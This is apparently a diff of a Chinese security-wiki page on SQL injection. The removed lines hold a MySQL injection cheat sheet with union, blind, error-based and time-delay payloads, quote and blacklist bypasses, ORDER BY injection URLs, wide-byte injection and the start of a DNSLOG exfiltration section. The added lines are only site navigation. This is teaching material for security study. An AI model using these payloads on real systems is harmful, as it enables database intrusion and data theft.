-<span class=k>SELECT</span> <span class=n>table_schema</span><span class=p>,</span> <span class=k>table_name</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span> <span class=k>WHERE</span> <span class=n>table_schema</span><span class=o>!=</span><span class=s1>&#39;information_schema&#39;</span> <span class=k>AND</span> <span class=n>table_schema</span><span class=o>!=</span><span class=s1>&#39;mysql&#39;</span><span class=p>;</span>
-</code></pre></div> </li> <li> <p>盲注</p> <div class=highlight><pre><span></span><code><span class=k>AND</span> <span class=k>SELECT</span> <span class=n>SUBSTR</span><span class=p>(</span><span class=k>table_name</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span> <span class=o>&gt;</span> <span class=s1>&#39;A&#39;</span>
-</code></pre></div> </li> <li> <p>报错</p> <div class=highlight><pre><span></span><code><span class=k>AND</span><span class=p>(</span><span class=k>SELECT</span> <span class=k>COUNT</span><span class=p>(</span><span class=o>*</span><span class=p>)</span> <span class=k>FROM</span> <span class=p>(</span><span class=k>SELECT</span> <span class=mi>1</span> <span class=k>UNION</span> <span class=k>SELECT</span> <span class=k>null</span> <span class=k>UNION</span> <span class=k>SELECT</span> <span class=o>!</span><span class=mi>1</span><span class=p>)</span><span class=n>x</span> <span class=k>GROUP</span> <span class=k>BY</span> <span class=n>CONCAT</span><span class=p>((</span><span class=k>SELECT</span> <span class=k>table_name</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span> <span class=k>LIMIT</span> <span class=mi>1</span><span class=p>),</span><span class=n>FLOOR</span><span class=p>(</span><span class=n>RAND</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)))</span> <span class=p>(</span><span class=o>@</span><span class=p>:</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>||@</span> <span class=k>GROUP</span> <span class=k>BY</span> <span class=n>CONCAT</span><span class=p>((</span><span class=k>SELECT</span> <span class=k>table_name</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span> <span class=k>LIMIT</span> <span class=mi>1</span><span class=p>),</span><span class=o>!@</span><span class=p>)</span> <span class=k>HAVING</span> <span class=o>@||</span><span class=k>MIN</span><span class=p>(</span><span class=o>@</span><span class=p>:</span><span class=o>=</span><span class=mi>0</span><span class=p>);</span> <span class=k>AND</span> <span class=n>ExtractValue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>CONCAT</span><span class=p>(</span><span class=mi>0</span><span class=n>x5c</span><span class=p>,</span> <span class=p>(</span><span class=k>SELECT</span> <span class=k>table_name</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span> <span class=k>LIMIT</span> <span class=mi>1</span><span class=p>)));</span>
-<span class=c1>-- 在5.1.5版本中成功。</span>
-</code></pre></div> </li> </ul> <h3 id=_12>列名<a class=headerlink href=#_12 title="Permanent link">&para;</a></h3> <ul> <li> <p>union 查询</p> <div class=highlight><pre><span></span><code><span class=k>UNION</span> <span class=k>SELECT</span> <span class=n>GROUP_CONCAT</span><span class=p>(</span><span class=k>column_name</span><span class=p>)</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span> <span class=k>WHERE</span> <span class=k>table_name</span> <span class=o>=</span> <span class=s1>&#39;tablename&#39;</span>
-</code></pre></div> </li> <li> <p>盲注</p> <div class=highlight><pre><span></span><code><span class=k>AND</span> <span class=k>SELECT</span> <span class=n>SUBSTR</span><span class=p>(</span><span class=k>column_name</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span> <span class=o>&gt;</span> <span class=s1>&#39;A&#39;</span>
-</code></pre></div> </li> <li> <p>报错</p> <div class=highlight><pre><span></span><code><span class=c1>-- 在5.1.5版本中成功</span>
-<span class=k>AND</span> <span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=k>SELECT</span> <span class=o>*</span> <span class=k>FROM</span> <span class=n>SOME_EXISTING_TABLE</span> <span class=k>UNION</span> <span class=k>SELECT</span> <span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span> <span class=k>LIMIT</span> <span class=mi>1</span><span class=p>)</span>
-<span class=c1>-- MySQL 5.1版本修复了</span>
-<span class=k>AND</span><span class=p>(</span><span class=k>SELECT</span> <span class=k>COUNT</span><span class=p>(</span><span class=o>*</span><span class=p>)</span> <span class=k>FROM</span> <span class=p>(</span><span class=k>SELECT</span> <span class=mi>1</span> <span class=k>UNION</span> <span class=k>SELECT</span> <span class=k>null</span> <span class=k>UNION</span> <span class=k>SELECT</span> <span class=o>!</span><span class=mi>1</span><span class=p>)</span><span class=n>x</span> <span class=k>GROUP</span> <span class=k>BY</span> <span class=n>CONCAT</span><span class=p>((</span><span class=k>SELECT</span> <span class=k>column_name</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span> <span class=k>LIMIT</span> <span class=mi>1</span><span class=p>),</span><span class=n>FLOOR</span><span class=p>(</span><span class=n>RAND</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)))</span> <span class=p>(</span><span class=o>@</span><span class=p>:</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>||@</span> <span class=k>GROUP</span> <span class=k>BY</span> <span class=n>CONCAT</span><span class=p>((</span><span class=k>SELECT</span> <span class=k>column_name</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span> <span class=k>LIMIT</span> <span class=mi>1</span><span class=p>),</span><span class=o>!@</span><span class=p>)</span> <span class=k>HAVING</span> <span class=o>@||</span><span class=k>MIN</span><span class=p>(</span><span class=o>@</span><span class=p>:</span><span class=o>=</span><span class=mi>0</span><span class=p>);</span> <span class=k>AND</span> <span class=n>ExtractValue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>CONCAT</span><span class=p>(</span><span class=mi>0</span><span class=n>x5c</span><span class=p>,</span> <span class=p>(</span><span class=k>SELECT</span> <span class=k>column_name</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span> <span class=k>LIMIT</span> <span class=mi>1</span><span class=p>)));</span>
-</code></pre></div> </li> <li> <p>利用 <code>PROCEDURE ANALYSE()</code></p> <div class=highlight><pre><span></span><code><span class=c1>-- 这个需要 web 展示页面有你所注入查询的一个字段</span>
-<span class=c1>-- 获得第一个段名</span>
-<span class=k>SELECT</span> <span class=n>username</span><span class=p>,</span> <span class=n>permission</span> <span class=k>FROM</span> <span class=n>Users</span> <span class=k>WHERE</span> <span class=n>id</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=mi>1</span> <span class=k>PROCEDURE</span> <span class=k>ANALYSE</span><span class=p>()</span>
-<span class=c1>-- 获得第二个段名</span>
-<span class=mi>1</span> <span class=k>LIMIT</span> <span class=mi>1</span><span class=p>,</span><span class=mi>1</span> <span class=k>PROCEDURE</span> <span class=k>ANALYSE</span><span class=p>()</span>
-<span class=c1>-- 获得第三个段名</span>
-<span class=mi>1</span> <span class=k>LIMIT</span> <span class=mi>2</span><span class=p>,</span><span class=mi>1</span> <span class=k>PROCEDURE</span> <span class=k>ANALYSE</span><span class=p>()</span>
-</code></pre></div> </li> </ul> <h3 id=_13>根据列名查询所在的表<a class=headerlink href=#_13 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=c1>-- 查询字段名为 username 的表</span>
-<span class=k>SELECT</span> <span class=k>table_name</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span> <span class=k>WHERE</span> <span class=k>column_name</span> <span class=o>=</span> <span class=s1>&#39;username&#39;</span><span class=p>;</span>
-<span class=c1>-- 查询字段名中包含 username 的表</span>
-<span class=k>SELECT</span> <span class=k>table_name</span> <span class=k>FROM</span> <span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span> <span class=k>WHERE</span> <span class=k>column_name</span> <span class=k>LIKE</span> <span class=s1>&#39;%user%&#39;</span><span class=p>;</span>
-</code></pre></div> <h3 id=_14>绕过引号限制<a class=headerlink href=#_14 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=c1>-- hex 编码</span>
-<span class=k>SELECT</span> <span class=o>*</span> <span class=k>FROM</span> <span class=n>Users</span> <span class=k>WHERE</span> <span class=n>username</span> <span class=o>=</span> <span class=mi>0</span><span class=n>x61646D696E</span>
-<span class=c1>-- char() 函数</span>
-<span class=k>SELECT</span> <span class=o>*</span> <span class=k>FROM</span> <span class=n>Users</span> <span class=k>WHERE</span> <span class=n>username</span> <span class=o>=</span> <span class=nb>CHAR</span><span class=p>(</span><span class=mi>97</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=mi>109</span><span class=p>,</span> <span class=mi>105</span><span class=p>,</span> <span class=mi>110</span><span class=p>)</span>
-</code></pre></div> <h3 id=_15>绕过字符串黑名单<a class=headerlink href=#_15 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=k>SELECT</span> <span class=s1>&#39;a&#39;</span> <span class=s1>&#39;d&#39;</span> <span class=s1>&#39;mi&#39;</span> <span class=s1>&#39;n&#39;</span><span class=p>;</span>
-<span class=k>SELECT</span> <span class=n>CONCAT</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=s1>&#39;d&#39;</span><span class=p>,</span> <span class=s1>&#39;m&#39;</span><span class=p>,</span> <span class=s1>&#39;i&#39;</span><span class=p>,</span> <span class=s1>&#39;n&#39;</span><span class=p>);</span>
-<span class=k>SELECT</span> <span class=n>CONCAT_WS</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=s1>&#39;d&#39;</span><span class=p>,</span> <span class=s1>&#39;m&#39;</span><span class=p>,</span> <span class=s1>&#39;i&#39;</span><span class=p>,</span> <span class=s1>&#39;n&#39;</span><span class=p>);</span>
-<span class=k>SELECT</span> <span class=n>GROUP_CONCAT</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=s1>&#39;d&#39;</span><span class=p>,</span> <span class=s1>&#39;m&#39;</span><span class=p>,</span> <span class=s1>&#39;i&#39;</span><span class=p>,</span> <span class=s1>&#39;n&#39;</span><span class=p>);</span>
-</code></pre></div> <p>使用 <code>CONCAT()</code> 时，任何个参数为 null，将返回 null，推荐使用 <code>CONCAT_WS()</code>。<code>CONCAT_WS()</code>函数第一个参数表示用哪个字符间隔所查询的结果。</p> <h3 id=_16>条件语句<a class=headerlink href=#_16 title="Permanent link">&para;</a></h3> <p><code>CASE</code>, <code>IF()</code>, <code>IFNULL()</code>, <code>NULLIF()</code>.</p> <div class=highlight><pre><span></span><code><span class=k>SELECT</span> <span class=k>IF</span><span class=p>(</span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=k>true</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>
-<span class=k>SELECT</span> <span class=k>CASE</span> <span class=k>WHEN</span> <span class=mi>1</span><span class=o>=</span><span class=mi>1</span> <span class=k>THEN</span> <span class=k>true</span> <span class=k>ELSE</span> <span class=k>false</span> <span class=k>END</span><span class=p>;</span>
-</code></pre></div> <h3 id=_17>延时函数<a class=headerlink href=#_17 title="Permanent link">&para;</a></h3> <p><code>SLEEP()</code>, <code>BENCHMARK()</code>.</p> <div class=highlight><pre><span></span><code><span class=s1>&#39; - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(&#39;</span><span class=k>true</span><span class=s1>&#39;)), false)) - &#39;</span>
-</code></pre></div> <h3 id=order-by>order by 后的注入<a class=headerlink href=#order-by title="Permanent link">&para;</a></h3> <p><code>order by</code> 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 <code>order</code> 或者 <code>order by</code> 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：</p> <p>原始链接：<code>http://www.test.com/list.php?order=vote</code></p> <p>根据 <code>vote</code> 字段排序。找到投票数最大的票数 <code>num</code> 然后构造以下链接：</p> <div class=highlight><pre><span></span><code>http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc
-</code></pre></div> <p>看排序是否变化。还有一种方法不需要知道任何字段信息，使用 <code>rand</code> 函数：</p> <div class=highlight><pre><span></span><code>http://www.test.com/list.php?order=rand(true)
-http://www.test.com/list.php?order=rand(false)
-</code></pre></div> <p>以上两个会返回不同的排序，判断表名中第一个字符是否小于 128 的语句如下：</p> <div class=highlight><pre><span></span><code>http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))
-</code></pre></div> <h3 id=_18>宽字节注入<a class=headerlink href=#_18 title="Permanent link">&para;</a></h3> <p>国内最常使用的 GBK 编码，这种方式主要是绕过 <code>addslashes</code> 等对特殊字符进行转移的绕过。反斜杠 <code>\</code> 的十六进制为 <code>%5c</code>，在你输入 <code>%bf%27</code> 时，函数遇到单引号自动转移加入 <code>\</code>，此时变为 <code>%bf%5c%27</code>，<code>%bf%5c</code> 在 GBK 中变为一个宽字符「縗」。<code>%bf</code> 那个位置可以是 <code>%81-%fe</code> 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。</p> <h3 id=dnslog>DNSLOG注入<a class=headerlink href=#dnslog title="Permanent link">&para;</a></h3> <p><strong>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</strong></p> <p>dnslog平台：<a href=http://ceye.io/ >http://ceye.io/</a></p> <p><div class=highlight><pre><span></span><code>mysql&gt; use security;
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        <meta name="author" content="Conflux Wiki Team">
+        <link rel="canonical" href="https://conflux-wiki.github.io/web/sqli/">
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>SQL 注入 - Conflux Wiki</title>
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css">
+        <link href="../../static/css/extra.css" rel="stylesheet">
+
+        <script src="../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../js/bootstrap.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../..">Conflux Wiki</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Start <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../.." class="dropdown-item">简介</a>
+</li>
+                                    
+<li>
+    <a href="../../usage/" class="dropdown-item">如何使用 Conflux Wiki</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">贡献指南</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../contribute/before-contributing/" class="dropdown-item">贡献之前</a>
+</li>
+            
+<li>
+    <a href="../../contribute/basic-contribute-approach/" class="dropdown-item">基本贡献方式</a>
+</li>
+            
+<li>
+    <a href="../../contribute/documentation-requirement/" class="dropdown-item">贡献文档要求</a>
+</li>
+            
+<li>
+    <a href="../../contribute/translation/" class="dropdown-item">翻译</a>
+</li>
+    </ul>
+  </li>
+                                    
+<li>
+    <a href="../../discussion/" class="dropdown-item">讨论交流</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Introduction <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../introduction/history/" class="dropdown-item">区块链 历史</a>
+</li>
+                                    
+<li>
+    <a href="../../introduction/link/" class="dropdown-item">Conflux相关链接</a>
+</li>
+                                    
+<li>
+    <a href="../../introduction/highlight-time/" class="dropdown-item">重要时刻</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Crypto <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../crypto/introduction/" class="dropdown-item">密码学简介</a>
+</li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">基础数学知识</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/basic/introduction/" class="dropdown-item">基础数学知识</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">古典密码</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/classical/introduction/" class="dropdown-item">古典密码简介</a>
+</li>
+            
+<li>
+    <a href="../../crypto/classical/monoalphabetic/" class="dropdown-item">单表代换加密</a>
+</li>
+            
+<li>
+    <a href="../../crypto/classical/polyalphabetic/" class="dropdown-item">多表代换加密</a>
+</li>
+            
+<li>
+    <a href="../../crypto/classical/others/" class="dropdown-item">其它类型加密</a>
+</li>
+            
+<li>
+    <a href="../../crypto/classical/summary/" class="dropdown-item">总结</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">流密码</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/streamcipher/intro/" class="dropdown-item">流密码</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">伪随机数生成器</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/streamcipher/prng/intro/" class="dropdown-item">伪随机数生成器介绍</a>
+</li>
+            
+<li>
+    <a href="../../crypto/streamcipher/prng/csprng/" class="dropdown-item">密码安全伪随机数生成器</a>
+</li>
+            
+<li>
+    <a href="../../crypto/streamcipher/prng/problem/" class="dropdown-item">题目</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">线性同余生成器</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/streamcipher/lcg/intro/" class="dropdown-item">线性同余生成器</a>
+</li>
+            
+<li>
+    <a href="../../crypto/streamcipher/lcg/challenge/" class="dropdown-item">题目</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">反馈移位寄存器</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/streamcipher/fsr/intro/" class="dropdown-item">反馈移位寄存器</a>
+</li>
+            
+<li>
+    <a href="../../crypto/streamcipher/fsr/lfsr/" class="dropdown-item">线性反馈移位寄存器 - LFSR</a>
+</li>
+            
+<li>
+    <a href="../../crypto/streamcipher/fsr/nfsr/" class="dropdown-item">非线性反馈移位寄存器</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">特殊流密码</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/streamcipher/special/rc4/" class="dropdown-item">RC4</a>
+</li>
+    </ul>
+  </li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">块加密</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/blockcipher/introduction/" class="dropdown-item">块加密</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">ARX</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/blockcipher/arx-operations/" class="dropdown-item">ARX: Add-Rotate-Xor</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">DES</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/blockcipher/des/" class="dropdown-item">DES</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">IDEA</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/blockcipher/idea/" class="dropdown-item">IDEA</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">AES</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/blockcipher/aes/" class="dropdown-item">AES</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Simon and Speck</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/blockcipher/simon-speck/" class="dropdown-item">Simon and Speck Block Ciphers</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">分组模式</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/blockcipher/mode/introduction/" class="dropdown-item">分组模式</a>
+</li>
+            
+<li>
+    <a href="../../crypto/blockcipher/mode/padding/" class="dropdown-item">填充方式</a>
+</li>
+            
+<li>
+    <a href="../../crypto/blockcipher/mode/ecb/" class="dropdown-item">ECB</a>
+</li>
+            
+<li>
+    <a href="../../crypto/blockcipher/mode/cbc/" class="dropdown-item">CBC</a>
+</li>
+            
+<li>
+    <a href="../../crypto/blockcipher/mode/pcbc/" class="dropdown-item">PCBC</a>
+</li>
+            
+<li>
+    <a href="../../crypto/blockcipher/mode/cfb/" class="dropdown-item">CFB</a>
+</li>
+            
+<li>
+    <a href="../../crypto/blockcipher/mode/ofb/" class="dropdown-item">OFB</a>
+</li>
+            
+<li>
+    <a href="../../crypto/blockcipher/mode/ctr/" class="dropdown-item">CTR</a>
+</li>
+            
+<li>
+    <a href="../../crypto/blockcipher/mode/padding-oracle-attack/" class="dropdown-item">Padding Oracle Attack</a>
+</li>
+    </ul>
+  </li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">非对称加密</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/asymmetric/introduction/" class="dropdown-item">介绍</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">RSA</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/asymmetric/rsa/rsa_theory/" class="dropdown-item">RSA 介绍</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/rsa/rsa_module_attack/" class="dropdown-item">模数相关攻击</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/rsa/rsa_e_attack/" class="dropdown-item">公钥指数相关攻击</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/rsa/rsa_d_attack/" class="dropdown-item">私钥 d 相关攻击</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/rsa/rsa_coppersmith_attack/" class="dropdown-item">Coppersmith 相关攻击</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/" class="dropdown-item">RSA 选择明密文攻击</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/rsa/rsa_side_channel/" class="dropdown-item">RSA 侧信道攻击</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/rsa/rsa_pkcs_attack/" class="dropdown-item">Bleichenbacher's attack</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/rsa/rsa_complex/" class="dropdown-item">RSA 复杂题目</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">背包加密</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/asymmetric/knapsack/knapsack/" class="dropdown-item">背包加密</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">离散对数相关</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/asymmetric/discrete-log/discrete-log/" class="dropdown-item">离散对数</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/discrete-log/elgamal/" class="dropdown-item">ElGamal</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/discrete-log/ecc/" class="dropdown-item">ECC</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">格密码</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/asymmetric/lattice/overview/" class="dropdown-item">格概述</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/lattice/introduction/" class="dropdown-item">基本介绍</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/lattice/lattice-reduction/" class="dropdown-item">格基规约算法</a>
+</li>
+            
+<li>
+    <a href="../../crypto/asymmetric/lattice/cvp/" class="dropdown-item">CVP</a>
+</li>
+    </ul>
+  </li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">哈希函数</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/hash/introduction/" class="dropdown-item">哈希函数</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">MD5</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/hash/md5/" class="dropdown-item">MD5</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">SHA1</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/hash/sha1/" class="dropdown-item">SHA1</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">FNV</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/hash/fnv/" class="dropdown-item">Fowler–Noll–Vo hash function</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">Hash Attack</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/hash/attack/" class="dropdown-item">Hash Attack</a>
+</li>
+    </ul>
+  </li>
+            
+<li>
+    <a href="../../crypto/hash/complex/" class="dropdown-item">综合题目</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">数字签名</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/signature/introduction/" class="dropdown-item">数字签名</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">RSA 数字签名</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/signature/rsa/" class="dropdown-item">RSA 数字签名</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">ElGamal 数字签名</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/signature/elgamal/" class="dropdown-item">ElGamal</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">DSA 数字签名</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/signature/dsa/" class="dropdown-item">DSA</a>
+</li>
+    </ul>
+  </li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">攻击思想总结</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/attack-summary/attack-mode/" class="dropdown-item">简介</a>
+</li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">中间相遇攻击</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/attack-summary/meet-in-the-middle/" class="dropdown-item">中间相遇攻击 - MITM</a>
+</li>
+    </ul>
+  </li>
+            
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">比特攻击</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/attack-summary/bit-attack/" class="dropdown-item">比特攻击</a>
+</li>
+    </ul>
+  </li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">证书格式</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../../crypto/certificate/introduction/" class="dropdown-item">证书格式</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Development <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../development/introduction/" class="dropdown-item">Conflux应用开发入门</a>
+</li>
